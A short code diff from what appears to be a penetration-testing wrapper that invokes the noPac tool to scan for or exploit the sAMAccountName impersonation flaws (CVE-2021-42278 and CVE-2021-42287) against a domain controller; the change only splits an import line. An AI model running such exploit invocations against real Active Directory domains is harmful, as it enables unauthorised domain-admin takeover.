@@ -22,7 +22,8 @@ def run(args: Any) -> int:
     print("[*] sAMAccountName Impersonation (CVE-2021-42278 + CVE-2021-42287)")
     print("[*] Domain: {}  DC: {}".format(cred.domain, dc_ip or "auto"))
 
-    import subprocess, shutil
+    import subprocess
+    import shutil
     nopac = shutil.which("noPac.py") or shutil.which("noPac")
     if nopac:
         cmd = [nopac, "scan" if not dc_name else "exploit",
